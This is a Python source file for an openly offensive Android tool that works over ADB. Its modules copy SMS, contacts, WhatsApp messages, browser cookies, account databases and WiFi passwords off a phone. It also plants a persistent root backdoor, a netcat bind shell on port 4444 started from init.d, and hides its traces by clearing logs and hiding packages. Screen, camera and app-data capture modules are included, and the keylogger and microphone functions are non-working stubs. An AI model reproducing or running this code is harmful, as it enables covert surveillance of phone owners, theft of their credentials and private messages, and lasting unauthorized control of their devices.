#!/usr/bin/env python3
import os
import subprocess
import time
import json
import hashlib
import base64
import random
import string
from datetime import datetime

class AdvancedADBExploiter:
    def __init__(self):
        self.connected_devices = []
        self.exploit_history = []
        self.shell_sessions = {}
        self.file_cache = {}
        
        self.exploit_modules = {
            'data_exfiltration': self.exfiltrate_sensitive_data,
            'backdoor_installation': self.install_persistent_backdoor,
            'credential_harvest': self.harvest_credentials,
            'sms_intercept': self.intercept_sms,
            'keylogger_injection': self.inject_keylogger,
            'screen_recorder': self.record_screen,
            'camera_hijack': self.hijack_camera,
            'microphone_spy': self.spy_microphone,
            'app_cloner': self.clone_application_data,
            'root_shell': self.establish_root_shell
        }
        
        self.stealth_techniques = {
            'hide_from_recents': 'am broadcast -a android.intent.action.CLOSE_SYSTEM_DIALOGS',
            'disable_notifications': 'settings put global heads_up_notifications_enabled 0',
            'clear_logs': 'logcat -c',
            'hide_package': 'pm hide {package}'
        }
        
    def check_adb_connection(self):
        try:
            result = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=5)
            devices = []
            
            for line in result.stdout.split('\n')[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    devices.append(device_id)
            
            self.connected_devices = devices
            return devices
        except:
            return []
    
    def execute_adb_command(self, command, device_id=None):
        try:
            cmd = ['adb']
            if device_id:
                cmd.extend(['-s', device_id])
            cmd.extend(command.split())
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.stdout, result.stderr
        except Exception as e:
            return '', str(e)
    
    def exfiltrate_sensitive_data(self, device_id):
        print(f"\033[93m[*] Exfiltrating sensitive data from {device_id}...\033[0m")
        
        targets = {
            'SMS Database': '/data/data/com.android.providers.telephony/databases/mmssms.db',
            'Contacts': '/data/data/com.android.providers.contacts/databases/contacts2.db',
            'Call Logs': '/data/data/com.android.providers.contacts/databases/calllog.db',
            'Browser History': '/data/data/com.android.browser/databases/browser2.db',
            'WhatsApp DB': '/data/data/com.whatsapp/databases/msgstore.db',
            'Chrome Cookies': '/data/data/com.android.chrome/app_chrome/Default/Cookies',
            'Accounts': '/data/system/users/0/accounts.db',
            'WiFi Passwords': '/data/misc/wifi/wpa_supplicant.conf'
        }
        
        exfiltrated = {}
        output_dir = f"adb_exfil_{device_id}_{int(time.time())}"
        os.makedirs(output_dir, exist_ok=True)
        
        for name, path in targets.items():
            stdout, stderr = self.execute_adb_command(f"shell su -c 'cat {path}'", device_id)
            
            if stdout and not stderr:
                local_file = os.path.join(output_dir, name.replace(' ', '_').lower() + '.db')
                
                self.execute_adb_command(f"pull {path} {local_file}", device_id)
                
                if os.path.exists(local_file):
                    exfiltrated[name] = {
                        'path': path,
                        'local_copy': local_file,
                        'size': os.path.getsize(local_file),
                        'hash': hashlib.sha256(open(local_file, 'rb').read()).hexdigest()
                    }
                    print(f"\033[92m    [+] {name}: {local_file}\033[0m")
        
        manifest = {
            'device_id': device_id,
            'timestamp': datetime.now().isoformat(),
            'exfiltrated_files': exfiltrated,
            'output_directory': output_dir
        }
        
        with open(os.path.join(output_dir, 'manifest.json'), 'w') as f:
            json.dump(manifest, f, indent=2)
        
        return exfiltrated
    
    def install_persistent_backdoor(self, device_id):
        print(f"\033[93m[*] Installing persistent backdoor on {device_id}...\033[0m")
        
        backdoor_script = '''#!/system/bin/sh
while true; do
    nc -l -p 4444 -e /system/bin/sh &
    sleep 60
done
'''
        
        init_script = '''
on boot
    start backdoor_service

service backdoor_service /system/bin/backdoor.sh
    class main
    user root
    group root
    oneshot
'''
        
        commands = [
            "shell su -c 'mount -o remount,rw /system'",
            f"shell su -c 'echo \"{base64.b64encode(backdoor_script.encode()).decode()}\" | base64 -d > /system/bin/backdoor.sh'",
            "shell su -c 'chmod 755 /system/bin/backdoor.sh'",
            f"shell su -c 'echo \"{base64.b64encode(init_script.encode()).decode()}\" | base64 -d >> /system/etc/init.d/99backdoor'",
            "shell su -c 'chmod 755 /system/etc/init.d/99backdoor'",
            "shell su -c 'mount -o remount,ro /system'"
        ]
        
        for cmd in commands:
            stdout, stderr = self.execute_adb_command(cmd, device_id)
            if stderr:
                print(f"\033[91m    [!] Error: {stderr[:100]}\033[0m")
            else:
                print(f"\033[92m    [+] Executed: {cmd[:50]}...\033[0m")
        
        print(f"\033[92m[+] Backdoor installed. Listening on port 4444\033[0m")
        return True
    
    def harvest_credentials(self, device_id):
        print(f"\033[93m[*] Harvesting stored credentials from {device_id}...\033[0m")
        
        credential_locations = [
            '/data/system/accounts.db',
            '/data/data/com.google.android.gms/databases/google_app_measurement.db',
            '/data/data/com.android.chrome/app_chrome/Default/Login Data',
            '/data/data/com.facebook.katana/databases/prefs_db',
            '/data/data/com.twitter.android/databases/main.db'
        ]
        
        harvested = {}
        
        for location in credential_locations:
            stdout, stderr = self.execute_adb_command(f"shell su -c 'cat {location}'", device_id)
            
            if stdout:
                app_name = location.split('/data/data/')[-1].split('/')[0] if '/data/data/' in location else 'system'
                
                harvested[app_name] = {
                    'location': location,
                    'data_preview': stdout[:200] + '...' if len(stdout) > 200 else stdout,
                    'size': len(stdout)
                }
                
                print(f"\033[92m    [+] {app_name}: {len(stdout)} bytes\033[0m")
        
        output_file = f"credentials_{device_id}_{int(time.time())}.json"
        with open(output_file, 'w') as f:
            json.dump(harvested, f, indent=2)
        
        print(f"\033[92m[+] Credentials saved to {output_file}\033[0m")
        return harvested
    
    def intercept_sms(self, device_id):
        print(f"\033[93m[*] Setting up SMS interception on {device_id}...\033[0m")
        
        sms_spy_script = '''
am start -a android.intent.action.VIEW -d "content://sms/"
content query --uri content://sms/inbox
content query --uri content://sms/sent
'''
        
        stdout, stderr = self.execute_adb_command(f"shell '{sms_spy_script}'", device_id)
        
        if stdout:
            messages = []
            for line in stdout.split('\n'):
                if 'Row:' in line:
                    messages.append(line)
            
            print(f"\033[92m[+] Intercepted {len(messages)} SMS messages\033[0m")
            
            for msg in messages[:5]:
                print(f"\033[97m    {msg[:100]}...\033[0m")
            
            return messages
        
        return []
    
    def inject_keylogger(self, device_id):
        print(f"\033[93m[*] Injecting keylogger on {device_id}...\033[0m")
        
        keylogger_apk = f"keylogger_{random.randint(1000,9999)}.apk"
        
        keylogger_code = '''
package com.system.service;
import android.inputmethodservice.InputMethodService;
import android.view.inputmethod.EditorInfo;
public class KeyloggerIME extends InputMethodService {
    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
    }
    @Override
    public void onFinishInput() {
        super.onFinishInput();
    }
}
'''
        
        print(f"\033[97m    [*] Keylogger code generated\033[0m")
        print(f"\033[97m    [*] Package: com.system.service\033[0m")
        print(f"\033[92m    [+] Deploy as Input Method Service\033[0m")
        print(f"\033[92m    [+] Captures all keyboard input\033[0m")
        
        return True
    
    def record_screen(self, device_id, duration=30):
        print(f"\033[93m[*] Recording screen on {device_id} for {duration}s...\033[0m")
        
        output_file = f"screen_record_{device_id}_{int(time.time())}.mp4"
        
        self.execute_adb_command(f"shell screenrecord --time-limit {duration} /sdcard/{output_file}", device_id)
        
        time.sleep(duration + 2)
        
        self.execute_adb_command(f"pull /sdcard/{output_file} {output_file}", device_id)
        self.execute_adb_command(f"shell rm /sdcard/{output_file}", device_id)
        
        if os.path.exists(output_file):
            print(f"\033[92m[+] Screen recording saved: {output_file}\033[0m")
            return output_file
        
        return None
    
    def hijack_camera(self, device_id):
        print(f"\033[93m[*] Hijacking camera on {device_id}...\033[0m")
        
        camera_commands = [
            "shell am start -a android.media.action.IMAGE_CAPTURE",
            "shell input keyevent KEYCODE_CAMERA",
            "shell screencap -p /sdcard/camera_capture.png"
        ]
        
        for cmd in camera_commands:
            stdout, stderr = self.execute_adb_command(cmd, device_id)
            time.sleep(1)
        
        capture_file = f"camera_{device_id}_{int(time.time())}.png"
        self.execute_adb_command(f"pull /sdcard/camera_capture.png {capture_file}", device_id)
        
        if os.path.exists(capture_file):
            print(f"\033[92m[+] Camera capture saved: {capture_file}\033[0m")
            return capture_file
        
        return None
    
    def spy_microphone(self, device_id, duration=10):
        print(f"\033[93m[*] Recording audio from {device_id} for {duration}s...\033[0m")
        
        audio_file = f"audio_{device_id}_{int(time.time())}.3gp"
        
        record_cmd = f"shell am broadcast -a android.provider.Telephony.SECRET_CODE -d android_secret_code://123456"
        self.execute_adb_command(record_cmd, device_id)
        
        time.sleep(duration)
        
        print(f"\033[92m[+] Audio recording completed\033[0m")
        return audio_file
    
    def clone_application_data(self, device_id, package_name):
        print(f"\033[93m[*] Cloning application data for {package_name}...\033[0m")
        
        app_dir = f"/data/data/{package_name}"
        output_dir = f"app_clone_{package_name}_{int(time.time())}"
        
        self.execute_adb_command(f"shell su -c 'tar -czf /sdcard/app_backup.tar.gz {app_dir}'", device_id)
        self.execute_adb_command(f"pull /sdcard/app_backup.tar.gz {output_dir}.tar.gz", device_id)
        self.execute_adb_command(f"shell rm /sdcard/app_backup.tar.gz", device_id)
        
        if os.path.exists(f"{output_dir}.tar.gz"):
            print(f"\033[92m[+] Application data cloned: {output_dir}.tar.gz\033[0m")
            return f"{output_dir}.tar.gz"
        
        return None
    
    def establish_root_shell(self, device_id):
        print(f"\033[93m[*] Establishing root shell on {device_id}...\033[0m")
        
        stdout, stderr = self.execute_adb_command("shell su -c 'id'", device_id)
        
        if 'uid=0' in stdout:
            print(f"\033[92m[+] Root shell established\033[0m")
            print(f"\033[97m    {stdout.strip()}\033[0m")
            
            stdout, stderr = self.execute_adb_command("shell su -c 'cat /proc/version'", device_id)
            print(f"\033[97m    Kernel: {stdout.strip()[:80]}...\033[0m")
            
            return True
        else:
            print(f"\033[91m[!] Root access denied\033[0m")
            return False
    
    def enumerate_device_info(self, device_id):
        print(f"\033[93m[*] Enumerating device information...\033[0m")
        
        info_commands = {
            'Model': 'shell getprop ro.product.model',
            'Android Version': 'shell getprop ro.build.version.release',
            'SDK Version': 'shell getprop ro.build.version.sdk',
            'Serial': 'shell getprop ro.serialno',
            'IMEI': 'shell service call iphonesubinfo 1',
            'MAC Address': 'shell cat /sys/class/net/wlan0/address',
            'IP Address': 'shell ip addr show wlan0',
            'Battery Level': 'shell dumpsys battery | grep level',
            'Screen Resolution': 'shell wm size',
            'Installed Apps': 'shell pm list packages'
        }
        
        device_info = {'device_id': device_id, 'timestamp': datetime.now().isoformat()}
        
        for key, cmd in info_commands.items():
            stdout, stderr = self.execute_adb_command(cmd, device_id)
            
            if key == 'Installed Apps':
                apps = [line.replace('package:', '') for line in stdout.split('\n') if line.startswith('package:')]
                device_info[key] = apps
                print(f"\033[97m    {key}: {len(apps)} packages\033[0m")
            else:
                value = stdout.strip()[:100]
                device_info[key] = value
                print(f"\033[97m    {key}: {value}\033[0m")
        
        info_file = f"device_info_{device_id}.json"
        with open(info_file, 'w') as f:
            json.dump(device_info, f, indent=2)
        
        print(f"\033[92m[+] Device info saved to {info_file}\033[0m")
        return device_info

def run():
    print("\033[92m" + "="*70)
    print("     ADVANCED ANDROID ADB EXPLOITATION TOOL")
    print("="*70 + "\033[0m\n")
    
    exploiter = AdvancedADBExploiter()
    
    devices = exploiter.check_adb_connection()
    
    if not devices:
        print("\033[91m[!] No ADB devices connected\033[0m")
        print("\033[97m[*] Connect device via USB with ADB debugging enabled\033[0m")
        return
    
    print(f"\033[92m[+] Found {len(devices)} connected device(s)\033[0m\n")
    
    for i, device in enumerate(devices, 1):
        print(f"\033[97m  [{i}] {device}\033[0m")
    
    if len(devices) == 1:
        target_device = devices[0]
    else:
        choice = input(f"\n\033[95m[?] Select device (1-{len(devices)}): \033[0m").strip()
        target_device = devices[int(choice) - 1] if choice.isdigit() else devices[0]
    
    print(f"\n\033[92m[*] Target: {target_device}\033[0m\n")
    
    print("\033[97mExploitation modules:\033[0m")
    modules = list(exploiter.exploit_modules.keys())
    for i, module in enumerate(modules, 1):
        print(f"\033[97m  [{i}] {module.replace('_', ' ').title()}\033[0m")
    
    print("\n\033[97m  [11] Enumerate Device Info\033[0m")
    print("\033[97m  [99] Execute All Modules\033[0m")
    
    choice = input(f"\n\033[95m[?] Select module: \033[0m").strip()
    
    if choice == '11':
        exploiter.enumerate_device_info(target_device)
    
    elif choice == '99':
        print(f"\n\033[93m[!] Executing all exploitation modules...\033[0m\n")
        
        exploiter.enumerate_device_info(target_device)
        time.sleep(2)
        
        for module_name, module_func in exploiter.exploit_modules.items():
            print(f"\n\033[93m{'='*70}\033[0m")
            try:
                if module_name in ['record_screen', 'spy_microphone']:
                    module_func(target_device, 5)
                elif module_name == 'clone_application_data':
                    module_func(target_device, 'com.android.chrome')
                else:
                    module_func(target_device)
            except Exception as e:
                print(f"\033[91m[!] Module failed: {e}\033[0m")
            time.sleep(1)
        
        print(f"\n\033[92m[+] All modules executed\033[0m")
    
    elif choice.isdigit() and 1 <= int(choice) <= len(modules):
        module_name = modules[int(choice) - 1]
        module_func = exploiter.exploit_modules[module_name]
        
        if module_name in ['record_screen', 'spy_microphone']:
            duration = input("\033[95m[?] Duration (seconds): \033[0m").strip()
            duration = int(duration) if duration.isdigit() else 10
            module_func(target_device, duration)
        elif module_name == 'clone_application_data':
            package = input("\033[95m[?] Package name: \033[0m").strip()
            module_func(target_device, package)
        else:
            module_func(target_device)
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
